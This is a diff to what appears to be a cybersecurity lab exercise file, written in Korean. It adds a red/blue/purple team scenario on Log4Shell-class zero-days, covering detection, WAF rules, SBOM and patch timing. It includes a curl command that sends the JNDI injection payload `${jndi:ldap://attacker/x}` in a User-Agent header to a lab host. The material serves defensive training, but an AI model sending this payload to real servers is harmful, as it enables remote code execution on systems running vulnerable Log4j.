@@ -192,6 +192,51 @@ steps:
       Red = Log4Shell payload 시도 / Blue = SCA scan + WAF custom rule / Purple =
       patch automation routine.
 
+      ## 📖 시나리오 상세
+
+      ### 🔴 Red Team — 0-Day Log4Shell-class 의 자동 exploit
+
+      **페르소나**: APT 또는 mass scanner (Shodan 의 자동 scanning) — Log4Shell 같은
+      0-Day 의 패치 전 의 mass exploitation. 2021-12 의 실제 사례 의 재현.
+
+      **공격 의도**:
+      1. **JNDI lookup 의 trigger** = User-Agent header 의 `${jndi:ldap://attacker/x}`
+         = Log4j 의 자동 lookup → RCE
+      2. **0-Day 의 특징** = signature 없음 = WAF 의 표준 룰 의 매치 X = 위험
+      3. **mass scanning** = 100+ vhost 의 자동 페이로드 → 1 hit = 즉시 침투
+
+      **공격 단계**:
+      - R1: curl 의 User-Agent 의 JNDI payload = Apache log 의 기록
+      - R2: ModSec audit log 의 매치 X 확인 = signature 부재
+      - R3: (개념) attacker LDAP server 의 callback = 침투 성공
+
+      ### 🔵 Blue Team — SCA + WAF custom rule + NVD sync
+
+      **탐지 source**:
+      - SCA (Trivy/Grype/Snyk) 의 dependency 의 known CVE 매치
+      - NVD JSON feed 의 자동 sync (cron 매 15분)
+      - WAF custom rule (community 의 30분 내 의 즉시 배포)
+      - SBOM 의 매 build 의 영구 기록
+
+      **대응**:
+      - B1: 0-Day 공개 = NVD sync 의 즉시 alert
+      - B2: WAF custom rule 의 즉시 배포 (community 의 30분)
+      - B3: 영향 자산 의 patch (target MTTP = 24h)
+      - B4: SBOM 의 영구 기록 + 다음 사건 의 base
+
+      ### 🟣 Purple Team — patch automation + MTTP 측정
+
+      **분석**:
+      - MTTP (Mean Time To Patch) 의 routine 측정 = 24h 목표
+      - 0-Day 의 detect → patch 의 cycle = WAF custom rule (즉시) → SCA scan (1시간)
+        → patch deploy (24h)
+
+      **개선 cycle**:
+      1. NVD sync 의 cron 자동화 (매 15분)
+      2. CI 통합 의 SCA scan (PR 시 의 의무)
+      3. SBOM 의 의무 화 (모든 build) + CycloneDX/SPDX
+      4. 분기 1회 의 unmaintained lib 의 review
+
       ## 💻 실행
       ```bash
       ssh 6v6-attacker 'curl -s -o /dev/null -w "Log4Shell %{http_code}\n" -H "Host: juice.6v6.lab" -H "User-Agent: \${jndi:ldap://attacker/x}" http://10.20.30.1/'
